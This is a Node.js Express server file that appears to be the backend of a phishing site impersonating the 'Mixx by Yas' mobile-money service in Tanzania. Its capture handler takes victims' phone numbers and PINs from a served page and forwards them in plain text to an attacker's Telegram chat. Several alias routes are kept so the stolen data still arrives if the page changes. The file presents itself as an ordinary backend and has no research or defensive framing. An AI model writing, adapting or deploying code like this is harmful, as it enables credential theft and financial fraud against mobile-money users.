// server.js — Mixx by Yas (Tanzania) backend (Render)

const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ---------- Config ----------
const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();

let publicUrl = process.env.PUBLIC_URL || '';
if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
  publicUrl = process.env.RENDER_EXTERNAL_URL;
}

// ---------- Telegram ----------
async function tgSend(text, retries = 3) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.warn('⚠️  Telegram env missing — cannot send');
    return false;
  }

  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
      const data = await res.json();
      if (!data.ok) {
        console.error(`Telegram error (attempt ${i + 1}):`, data);
        if (data.error_code === 400 || data.error_code === 401) break;
      } else {
        console.log('✅ Telegram message sent');
        return true;
      }
    } catch (err) {
      console.error(`Telegram send failed (attempt ${i + 1}):`, err.message);
      if (err.cause) console.error('  Cause:', err.cause.code, '—', err.cause.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
  return false;
}

async function tgSetWebhook() {
  if (!BOT_TOKEN || !publicUrl) {
    console.warn('⚠️  Cannot register webhook — BOT_TOKEN or publicUrl missing');
    return;
  }
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  try {
    console.log(`🔗 Registering webhook: ${webhookUrl}`);
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
    const data = await res.json();
    if (data.ok) console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
    else console.error('❌ Webhook failed:', data);
  } catch (err) {
    console.error('❌ Webhook error:', err.message);
  }
}

// ---------- Shared handler for capture ----------
async function handleCapture(req, res) {
  const { phone, pin } = req.body || {};

  console.log('📥 Capture:', { phone, pinLength: (pin || '').length });

  await tgSend(
    `🇹🇿 <b>Mixx by Yas — Nouvelle soumission</b>\n\n` +
    `📱 Téléphone: <b>+255 ${phone || '-'}</b>\n` +
    `🔑 PIN: <b>${pin || '-'}</b>`
  );

  res.json({ success: true, ok: true });
}

// ---------- API routes ----------

// The page POSTs to /Server
app.post('/Server', handleCapture);

// Also accept /api/checkout (future-proofing)
app.post('/api/checkout', handleCapture);

// Generic capture alias (in case you change the page)
app.post('/api/capture', handleCapture);

// Webhook receiver
app.post('/api/telegram-webhook', (req, res) => {
  console.log('📨 Telegram update:', JSON.stringify(req.body).slice(0, 200));
  res.sendStatus(200);
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ ok: true, service: 'mixx-by-yas-backend', uptime: process.uptime() });
});

// ---------- Serve the static site ----------
// HTML files live one level up from backend/
app.use(express.static(path.join(__dirname, '..')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// ---------- Start ----------
app.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
  console.log(`   BOT_TOKEN set: ${BOT_TOKEN ? 'YES' : 'NO'}`);
  console.log(`   CHAT_ID set:   ${CHAT_ID ? 'YES' : 'NO'}`);
  tgSetWebhook();
});
